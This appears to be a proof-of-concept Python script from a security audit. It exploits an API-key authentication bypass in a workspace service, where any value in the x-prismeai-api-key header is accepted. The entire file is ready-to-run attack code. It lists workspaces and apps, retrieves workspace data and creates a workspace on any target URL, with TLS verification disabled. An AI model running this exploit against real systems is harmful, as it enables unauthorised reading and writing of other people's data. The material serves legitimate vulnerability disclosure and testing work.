#!/usr/bin/env python3
"""
PoC #4 — API Key Authentication Bypass
CRITICAL: Any value in x-prismeai-api-key bypasses authentication on workspaces pipeline.
The key is never validated (TODO comment in source).

Usage: python3 poc_04_apikey_auth_bypass.py --target https://dev.example.com
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()

FAKE_API_KEY = "this-key-is-never-validated"


def test_list_workspaces(base_url):
    """List all workspaces without authentication."""
    print("\n[*] Test 1: List workspaces with fake API key...")

    url = f"{base_url}/v2/workspaces"
    headers = {"x-prismeai-api-key": FAKE_API_KEY}

    try:
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            count = len(data) if isinstance(data, list) else data.get("total", "unknown")
            print(f"  [CRITICAL] Workspace listing returned! Count: {count}")
            if isinstance(data, list) and data:
                print(f"  First workspace: {json.dumps(data[0], indent=2)[:500]}")
            elif isinstance(data, dict):
                print(f"  Response: {json.dumps(data, indent=2)[:500]}")
            return True
        elif r.status_code in (401, 403):
            print(f"  [OK] Authentication enforced")
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_get_workspace(base_url, workspace_id=None):
    """Get a specific workspace details."""
    if not workspace_id:
        # Try a common default
        workspace_id = "default"
    print(f"\n[*] Test 2: Get workspace '{workspace_id}' with fake API key...")

    url = f"{base_url}/v2/workspaces/{workspace_id}"
    headers = {"x-prismeai-api-key": FAKE_API_KEY}

    try:
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [CRITICAL] Workspace data returned!")
            print(f"  Response: {json.dumps(data, indent=2)[:800]}")
            return True
        elif r.status_code == 404:
            print(f"  [INFO] Workspace not found (but auth was bypassed if no 401)")
            return True  # Auth bypass still worked
        elif r.status_code in (401, 403):
            print(f"  [OK] Authentication enforced")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_list_apps(base_url):
    """List apps (also on workspaces pipeline with allowApiKeyOnly)."""
    print("\n[*] Test 3: List apps with fake API key...")

    url = f"{base_url}/v2/apps"
    headers = {"x-prismeai-api-key": FAKE_API_KEY}

    try:
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"  [CRITICAL] App listing returned!")
            print(f"  Response: {json.dumps(data, indent=2)[:500]}")
            return True
        elif r.status_code in (401, 403):
            print(f"  [OK] Authentication enforced")
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_create_workspace(base_url):
    """Attempt to create a workspace without auth — proves write access."""
    print("\n[*] Test 4: Create workspace with fake API key (write test)...")

    url = f"{base_url}/v2/workspaces"
    headers = {
        "x-prismeai-api-key": FAKE_API_KEY,
        "Content-Type": "application/json",
    }
    payload = {
        "name": "poc-auth-bypass-test",
        "description": "Security audit PoC — safe to delete",
    }

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            data = r.json()
            print(f"  [CRITICAL] Workspace CREATED without authentication!")
            print(f"  Workspace ID: {data.get('id', data.get('_id', 'unknown'))}")
            print(f"  Response: {json.dumps(data, indent=2)[:500]}")
            return True
        elif r.status_code in (401, 403):
            print(f"  [OK] Authentication enforced for writes")
        else:
            print(f"  Response: {r.text[:300]}")
        return False
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def test_no_header(base_url):
    """Baseline: confirm request without API key is rejected."""
    print("\n[*] Baseline: Request without any API key...")

    url = f"{base_url}/v2/workspaces"
    try:
        r = requests.get(url, verify=False, timeout=10)
        print(f"  Status: {r.status_code}")
        if r.status_code in (401, 403):
            print(f"  [OK] Unauthenticated request correctly rejected")
        else:
            print(f"  [INFO] Unexpected status: {r.text[:200]}")
        return r.status_code
    except Exception as e:
        print(f"  [ERROR] {e}")
        return None


def main():
    parser = argparse.ArgumentParser(description="PoC #4: API Key Auth Bypass")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", default=None, help="Known workspace ID to test")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print(f"[*] Using fake API key: {FAKE_API_KEY}")
    print("=" * 60)

    baseline = test_no_header(base)
    results = {}
    results["list_workspaces"] = test_list_workspaces(base)
    results["get_workspace"] = test_get_workspace(base, args.workspace_id)
    results["list_apps"] = test_list_apps(base)
    results["create_workspace"] = test_create_workspace(base)

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    print(f"  Baseline (no key): HTTP {baseline}")
    for k, v in results.items():
        print(f"  {k}: {'VULNERABLE' if v else 'NOT VULNERABLE'}")


if __name__ == "__main__":
    main()
